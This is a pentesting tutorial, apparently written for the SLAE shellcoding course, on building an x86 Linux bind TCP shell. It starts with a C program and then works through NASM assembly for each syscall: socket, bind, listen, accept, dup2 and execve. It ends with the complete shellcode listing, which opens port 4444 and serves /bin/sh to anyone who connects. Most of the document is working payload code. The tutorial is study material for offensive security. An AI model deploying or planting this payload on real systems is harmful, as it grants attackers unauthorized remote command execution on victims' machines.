# Bind TCP Shell

Today, we will deal with the process of creating Bind TCP Shell from scratch. As a rule, we distinguish between two types of shells that interest the pentester:
- Bind TCP Shell
- Reverse TCP Shell
In the first case, it involves opening a listening port on the victim's system so that the attacker can remotely connect to his shell.

First, we'll try to reproduce this behavior using a C program.

```c
#include <stdio.h>
#include <netinet/in.h>

// Change the correct port here
#define PORT 4444

int main(int argc, char **argv)
{	
	// sys_socket()	- Creating a socket (interface) for communication
	int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	// sys_bind() - Binding to a specified address and port 
	struct sockaddr_in address;
	address.sin_addr.s_addr = INADDR_ANY;
	address.sin_port = htons(PORT);
	address.sin_family = AF_INET;
	bind(bind_socket,(struct sockaddr *)&address, sizeof(address));
	
	// sys_listen() - Listening for incoming connection 
	listen(bind_socket,0);
	
	// sys_accept() - Accepting the incoming connection
	int sock = accept(bind_socket,NULL,NULL);
	
	// sys_dup2() - Configuring STDIN/STDOUT and STDERR for proper shell functioning
	dup2(sock,2);	// STDERR
	dup2(sock,1);	// STDOUT
	dup2(sock,0);	// STDIN
	
	// sys_execve() - Establishing a shell using /bin/sh
	execve("/bin/sh",NULL,NULL);
	
	return 0;
}
```

As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:

- sys_socket()
- sys_bind()
- sys_listen()
- sys_accept()
- sys_dup2()
- sys_ execve()

They are responsible for the whole process that the computer must perform to finally end with an open port waiting for connection.

So let's start creating our shellcode using NASM. I will try to divide this process into parts, distinguishing between different system calls called in the course.

First, we will start by clearing the registers we use, because in the case of the C language wrapper that we will be using, it may turn out to be very important (registers are not empty at the time of transition to the _start function).
```nasm
global _start

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx
```
Then, we proceed to create the socket. For this purpose, we will use socketcall() syscall, which will allow us to easily call subsequent types of system calls (socket, bind, listen ....).

At this point I would like to explain the principle of system calls. Their list, in the case of systems based on intel x86 processors, can be found in the file:
- /usr/include/i386-linux-gnu/asm/unistd_32.h

Each call system has its own identifier, which if you want to call directly describes it. For example, socketcall () has the identifier 102, which can be easily checked by grepping its name.
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep socketcall
#define __NR_socketcall 102
```
In addition, in order to call the system call, in most cases you will need to set the appropriate arguments (system calls should be treated as a function) in the correct registers and order.

Processor registers can be used as "containers" for arguments. In the case of system calls, it looks like this:
- EAX is responsible for the system call identifier
- EBX holds the first argument
- ECX holds the second argument
- EDX stores the third argument
- ESI stores the fourth argument
- EDI stores the fifth argument

Situations where more than five arguments should be used fall outside the scope of this article.

In the case of socketcall() syscall, the situation looks slightly different. 
Due to the fact that other types of system calls will be called with it, the arguments describing these types must be placed in the reverse order (!) On the stack, and then the ECX register (second argument) must point to the top of the stack, in such way that the processor can easily get to the called syscall arguments.

So we know that there must be 102 in the EAX registry. How do you know what further arguments are required? In most cases, use the man command.
```sh
$ man 2 socketcall
SOCKETCALL(2)              Linux Programmer's Manual             SOCKETCALL(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall()  is  a  common  kernel  entry  point for the socket system
       calls.  call determines which socket function to invoke.   args  points
       to a block containing the actual arguments, which are passed through to
       the appropriate call.
```
We see, therefore, that this syscall accepts two arguments. The first is socket function to invoke (for example, sys_socket()), the second indicates the arguments of this function (top of the stack in ECX).

The first function we call is sys_socket. Let's check its unique identifier.
For "minor" syscalls called by socketcall(), their list is in the file:
- /usr/include/linux/net.h
```sh
$ cat /usr/include/linux/net.h | grep sys_socket
#define SYS_SOCKET	1		/* sys_socket(2)		
```
Identifier is 1, let's check what arguments are expected. 
```sh
$ man 2 socket | grep "int socket"
int socket(int domain, int type, int protocol);
```
In most cases, the man command accurately describes what each argument means and where we can find the values that describe it. If not, everything is in Google :)
- AF_INET = 2 (PF_INET)
```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +122

#define AF_INET    PF_INET

$ vim /usr/include/i386-linux-gnu/bits/socket.h +78

#define PF_INET         2       /* IP protocol family
```
- SOCK_STREAM = 1
```sh
$ vim /usr/include/i386-linux-gnu/bits/socket.h +42

SOCK_STREAM = 1,              /* Sequenced, reliable, connection-based byte streams.  */
```
- IPPROTO_IP = 0
```sh
$ vim /usr/include/netinet/in.h + 34

IPPROTO_IP = 0,        /* Dummy protocol for TCP.  */
```
These arguments must be thrown in the reverse order due to the specifics of the stack.

Let's move to the NASM code:
```nasm
sys_socket:
	; {C code} --> int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage
```
The next call system will be sys_bind. The whole process looks very similar, except that we have here "throwing" arguments to the stack and indicating their top to the ECX register twice.

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_bind
#define SYS_BIND	2		/* sys_bind(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 bind | grep "int bind"
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
NASM code:
```nasm
sys_bind:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> bind(bind_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 2		; socketcall type - sys_bind

	; pushing the address struct arguments
	xor esi, esi
	push esi		; pushing INADDR_ANY = 0 (null)
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2 (must be word)

	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_bind arguments in reverse order (int bind_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution
```
Next in order - sys_listen()

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_listen
#define SYS_LISTEN	4		/* sys_listen(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 listen | grep "int listen"
int listen(int sockfd, int backlog);
```
NASM code:
```nasm
sys_listen:
	; {C code} --> listen(bind_socket,0);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 4		; socketcall type - sys_listen

	; pushing the sys_listen arguments in reverse order (int bind_socket, int backlog)
	xor esi,esi		
	push esi		; pushing backlog = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_listen() function arguments
	
	int 128			; syscall execution
```
Another simple syscall is sys_accept().

We check the system call identifier:
```sh
$ cat /usr/include/linux/net.h | grep sys_accept
#define SYS_ACCEPT	5		/* sys_accept(2)
```
And also the structure of the expected arguments:
```sh
$ man 2 accept | grep "int accept"
int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
```
NASM code:
```nasm
sys_accept:
	; {C code} --> int sock = accept(bind_socket,NULL,NULL);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 5		; socketcall type - sys_accept
	
	; pushing the sys_accept arguments in reverse order (int bind_socket, struct sockaddr *addr, socklen_t *addrlen)
	xor esi, esi
	push esi		; pushing socklen_t *addrlen = 0 (null)
	push esi		; pushing struct sockaddr *addr = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_accept() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage
```
Another syscall, sys_dup2() can be implemented in many ways, for example by using loops. I decided to do it step by step in order to better illustrate the arguments raised.
It is worth noting that it is not called from socketcall(), but directly as system syscall.

We check the system call identifier:
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
#define __NR_dup2 63
```
And also the structure of the expected arguments:
```sh
$ man 2 dup2 | grep "int dup2"
int dup2(int oldfd, int newfd);
```
NASM code:
```nasm
sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the bind_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution
```

The last syscall we call will be sys_execve. In this case we see the placement of the string "/bin/sh" + string terminator \x00 in the EBX registry, using a stack.

After doing this, syscall establishes a listening port with an assigned shell when someone connects to it.

We check the system call identifier:
```sh
$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
#define __NR_execve 11
```
And also the structure of the expected arguments:
```sh
$ man 2 execve | grep "int execve"
int execve(const char *filename, char *const argv[],
                  char *const envp[]);
```
NASM code:
```nasm
sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
```

That's all, below I present the entire code of the NASM file, which we will then put into the C language wrapper and try to execute.

```nasm
; Filename: bind_shell.nasm
; Author:   Jakub Heba
; Purpose:  SLAE Course & Exam

global _start			

; Header Files:
; -------------------------------------------------------------------------------------------------------
; |  Linux Syscall description file path: 		|  /usr/include/i386-linux-gnu/asm/unistd_32.h  |
; |  Linux Socketcall numbers:				|  /usr/include/linux/net.h		|
; |  Linux IP Protocols Declarations:			|  /usr/include/netinet/in.h		|
; |  Linux System-specific socket constants and types:	|  /usr/include/i386-linux-gnu/bits/socket.h	|
; |  Values for setsockopt():				|  /usr/include/asm-generic/socket.h	|
; -------------------------------------------------------------------------------------------------------

section .text
_start:

cleaning:
	; cleaning all registers for further usage
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

sys_socket:
	; {C code} --> int bind_socket = socket(AF_INET, SOCK_STREAM, 0);
	
	; syscall definition
	mov al, 102 		; syscall - socketcall
	mov bl, 1		; socketcall type - sys_socket

	; pushing the sys_socket atributes in reverse order (AF_INET, SOCK_STREAM, IPPROTO_IP)
	xor esi, esi		
	push esi		; IPPROTO_IP = 0 (null)
	push 1			; SOCK_STREAM = 1
	push 2			; AF_INET = 2 (PF_INET)

	mov ecx, esp 		; directing the stack pointer to sys_socket() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage

sys_bind:
	; {C code} --> struct sockaddr_in address;
        ; {C code} --> address.sin_addr.s_addr = INADDR_ANY;
        ; {C code} --> address.sin_port = htons(PORT);
        ; {C code} --> address.sin_family = AF_INET;
	; {C code} --> bind(bind_socket,(struct sockaddr *)&address, sizeof(address));

	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 2		; socketcall type - sys_bind

	; pushing the address struct arguments
	xor esi, esi
	push esi		; pushing INADDR_ANY = 0 (null)
	push word 0x5c11	; PORT = 4444 (change reverse hex value for different port)
	push word 2		; AF_INET = 2 (must be word, to hold the IP address)

	mov ecx, esp		; directing the stack pointer to address struct arguments
	
	; pushing the sys_bind arguments in reverse order (int bind_socket, const struct sockaddr *addr, socklen_t addrlen) 
	push 16			; socklen_t addrlen (size) = 16
	push ecx		; const struct sockaddr *addr - stack pointer with struct arguments	
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_bind() function arguments

	int 128			; syscall execution

sys_listen:
	; {C code} --> listen(bind_socket,0);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 4		; socketcall type - sys_listen

	; pushing the sys_listen arguments in reverse order (int bind_socket, int backlog)
	xor esi,esi		
	push esi		; pushing backlog = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_listen() function arguments
	
	int 128			; syscall execution

sys_accept:
	; {C code} --> int sock = accept(bind_socket,NULL,NULL);
	
	; syscall definition
	mov al, 102		; syscall - socketcall
	mov bl, 5		; socketcall type - sys_accept
	
	; pushing the sys_accept arguments in reverse order (int bind_socket, struct sockaddr *addr, socklen_t *addrlen)
	xor esi, esi
	push esi		; pushing socklen_t *addrlen = 0 (null)
	push esi		; pushing struct sockaddr *addr = 0 (null)
	push edx		; bind_socket pointer

	mov ecx, esp		; directing the stack pointer to sys_accept() function arguments

	int 128			; syscall execution

	mov edx, eax		; saving the bind_socket pointer for further usage

sys_dup2:
	; {C code} --> dup2(sock,2);
        ; {C code} --> dup2(sock,1);
        ; {C code} --> dup2(sock,0);

	; syscall definition
	mov al, 63		; syscall - dup2
	
	mov ebx, edx		; overwriting the bind_socket pointer
	xor ecx, ecx		; STDIN - 0 (null)

	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 1		; STDOUT - 1
	
	int 128			; syscall execution

	; syscall definition
	mov al, 63		; syscall - dup2
	mov cl, 2		; STDERR - 2

	int 128			; syscall execution

sys_execve:
	; {C code} --> execve("/bin/sh",NULL,NULL);

	; syscall definition
	mov al, 11		; syscall - execve

	; pushing the sys_execve string argument
	xor esi, esi
	push esi		; pushing 0 (null)

	push 0x68732f6e		; pushing "n/sh"
	push 0x69622f2f		; pushing "//bi"

        ; pushing the sys_execve arguments (const char *filename, char *const argv[], char *const envp[])
	mov ebx, esp		; directing the stack pointer to sys_execve() string argument
	xor ecx, ecx		; char *const envp[] = 0 (null)
	xor edx, edx		; char *const argv[] = 0 (null)

	int 128			; syscall execution
```
